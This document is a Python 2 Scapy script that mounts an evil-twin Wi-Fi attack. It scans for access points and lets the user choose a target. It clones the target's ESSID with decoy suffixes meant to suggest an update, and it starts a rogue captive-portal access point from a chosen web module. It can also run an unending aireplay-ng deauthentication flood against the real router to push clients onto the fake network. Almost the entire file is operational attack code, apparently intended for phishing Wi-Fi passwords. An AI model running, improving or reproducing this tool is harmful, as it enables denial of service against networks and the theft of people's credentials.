import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading

APs = {}

def add_network(pckt, known_networks):
        # Check to see if it's a hidden SSID (this could be resolved later using out Deauth attack)
        essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[Dot11Elt].info != '' else 'Hidden SSID'
        bssid = pckt[Dot11].addr3
        # This insight was included in airoscapy.py (http://www.thesprawl.org/projects/airoscapy/)
        channel = int(ord(pckt[Dot11Elt:3].info))

        if bssid not in known_networks:
                known_networks[bssid] = ( essid, channel )
                #print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)
                print str(len(APs) + 1) + "---" + str(channel) + "   " + str(essid) + "   " + str(bssid)

                APs [len(APs) + 1] = ( channel, essid, bssid )
                #APs.append (str(channel), str(essid), str(bssid))



# Channel hopper - This code is very similar to that found in airoscapy.py (http://www.thesprawl.org/projects/airoscapy/)
def channel_hopper(interface):
		i=1
		while i<14:
			channel = i
			os.system("iwconfig %s channel %d" % (interface + "mon", channel))
			time.sleep(1)
			i=i+1
			#print i
			if i==13:
				i=1

		time.sleep(2)
		print "\nScan completed"


def stop_channel_hop(signal, frame):
        # set the stop_sniff variable to True to stop the sniffer
        global stop_sniff
        stop_sniff = True
        channel_hop.terminate()
        channel_hop.join()

def keep_sniffing(pckt):
        return stop_sniff


def scann (interface, time):
	print "Scanning... (This will take: " + str(time) + " sec)"
	channel_hop = Process(target = channel_hopper, args=(interface,))
	channel_hop.start()
	sniff( lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), timeout=time, prn=lambda x: add_network(x,networks) )
	channel_hop.terminate()
	print "\nEND\n"

'''
def start_mon_mode(interface):
    print "Starting monitor mode: " + interface
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Could not start monitor mode')
'''

def start_mon_mode(interface):
	print "\nStarting monitor mode: " + interface
	try:
		os.system("airmon-ng check kill")
		os.system("airmon-ng start " + interface)
		return interface
	except Exception:
		print "Error starting monitor mode: " + interface



if __name__ == "__main__":
		networks = {}
		stop_sniff = False

		i_monitor = "wlan1"
		i_apmode = "wlan0"

		print "\nI'm going to use: \nMONITOR: " + i_monitor + "\t\tAP: " + i_apmode
		choose_interface = input ("\nPress 1 to edit, 0 to continue: ")

		if choose_interface == 1:
				i_monitor = raw_input ("Insert MONITOR (xxxx = null): ")
				i_apmode = raw_input ("Insert AP: ")

############################################################################################################
		if i_monitor != "xxxx": 
			start_mon_mode(i_monitor)
			scann (i_monitor, 35) #SET TIME HERE

			print '='*60 + '\nN\tCH\tESSID\t\t\tBSSID\n' + '='*60

			for i in APs:
				print "{0:1}\t{1:0}\t{2:25}{3:30}".format(str(i)+")", APs [i][0], APs [i][1], APs [i][2])

			#print APs

			choose = input ("\n" + "="*60 + "\nSelect Network: ")

			c_ch = str(APs [choose][0])
			c_essid = str(APs [choose][1])
			c_bssid = str(APs [choose][2])

############################################################################################################
		if i_monitor != "xxxx": 
			print "\n\n\n\n\n\n\n\n"
			print "="*40
			print "CUSTOM ESSID"
			print "="*40

			print ("1) " + c_essid + "\n2) " + c_essid + "_MOD_PROVVISIORIA"  + "\n3) " + c_essid + "_AGGIORNAMENTO\n4) CUSTOM...")
			essid_choose = input ("="*40 + "\nSelect ESSID: ")
			if essid_choose == 2:
					c_essid = c_essid + "_MOD_PROVVISIORIA"
			elif essid_choose == 3:
					c_essid = c_essid + "_AGGIORNAMENTO"
			elif essid_choose == 4:
					c_essid = raw_input ("Insert ESSID: ")

############################################################################################################

		else: 
			print "\n\n\n\n\n\n\n\n"
			print "="*40
			print "CUSTOM WIFI"
			print "="*40

			c_essid = raw_input ("Insert ESSID: ")
			c_ch = raw_input ("Insert CH: ")
			c_bssid = "00:11:22:AA:BB:CC"


############################################################################################################

		print "\n\n\n\n\n\n\n\n"
		print "="*40
		print "MODE"
		print "="*40

		s = subprocess.Popen(["ls ap_module -l | awk '{print $9}'"], shell=True, stdout=subprocess.PIPE).stdout
		available_folder = s.read().splitlines()

		for i in available_folder:
			if (i == "_bootstrap") or (i == ""):
				available_folder.remove(i)

		cont = 0
		for i in available_folder:
			print str(cont) + ") " + str(i)
			cont = cont + 1

		choosen_folder = input ("="*40 + "\nSelect MODULE: ")
		folder_module = available_folder [choosen_folder]

############################################################################################################

		print "\n\n\n\n\n\n\n\n"
		print "="*40
		print "AVAILABLE MODULES"
		print "="*40

		s = subprocess.Popen(["ls ap_module/"+ folder_module + " -l | awk '{print $9}'"], shell=True, stdout=subprocess.PIPE).stdout
		available_module = s.read().splitlines()

		for i in available_module:
			if (i == "_bootstrap") or (i == ""):
				available_module.remove(i)

		cont = 0
		for i in available_module:
			print str(cont) + ") " + str(i)
			cont = cont + 1

		choosen_module = input ("="*40 + "\nSelect MODULE: ")
		module_web = folder_module + "/" + available_module [choosen_module]

############################################################################################################
		while True:
			print "\n\n\n\n\n\n\n\n"
			print "="*40
			print "PASSWORD"
			print "="*40

			c_password = raw_input ("Insert PASSWORD (8 char): ")

			if len(c_password) > 7 or c_password == "":
				break

############################################################################################################
		if i_monitor != "xxxx":
			print "\n\n\n\n\n\n\n\n"
			print "="*40
			print "DEAUTH: " + str(APs [choose][1]) + " (" + c_bssid + ")"
			print "="*40

			print "0) Yes"
			print "1) No"
			print "="*40

			choosen_deauth = input ("\nSelect: ")

		else:
			choosen_deauth = 1

############################################################################################################

		print "\n\n\n\n\n\n\n\n"
		print "="*40
		print "RIEPILOGO"
		print "="*40
		print "MONITOR:         " + i_monitor
		print "AP:              " + i_apmode
		print "\n"
		print "Network CH:      " + c_ch 
		print "Network ESSID:   " + c_essid
		print "Network BSSID:   " + c_bssid
		print "Network PASSWORD:" + c_password
		print "\n"
		print "Module Choosen:  " + module_web
		print "Target Router:   " + c_bssid
		print "\n"
		if choosen_deauth == 0:
			print "Deauth:          " + "YES"
		else:
			print "Deauth:          " + "NO"
		print "="*40

		choose_interface = input ("\nPress 1 to abort, 0 to continue: ")

		if choose_interface == 1:
				exit()

############################################################################################################

		try:
			os.system("./captive_portal.sh stop")
			print "\n\n\n\n\n"
			print "./captive_portal.sh -i \"" + i_apmode + "\" -c \"" + c_ch + "\" -s \"" + c_essid + "\" -m \"" +  module_web + "\" -p \"" + c_password + "\" start"
			print "\n\n\n\n\n"
			os.system("./captive_portal.sh -i \"" + i_apmode + "\" -c \"" + c_ch + "\" -s \"" + c_essid + "\" -m \"" +  module_web + "\" -p \"" + c_password + "\" start")
		except Exception:
			print "ERROR EXECUTING SCRIPT"

############################################################################################################
		if choosen_deauth == 0:
			os.system("iwconfig %s channel %d" % (i_monitor + "mon", eval(c_ch)))

			print "Starting Deauth in 10 sec..."
			time.sleep(10)

			try:
				os.system("aireplay-ng -0 0 -a " + c_bssid + " " + i_monitor+"mon")
			except Exception:
				print "ERROR EXECUTING DEAUTH"






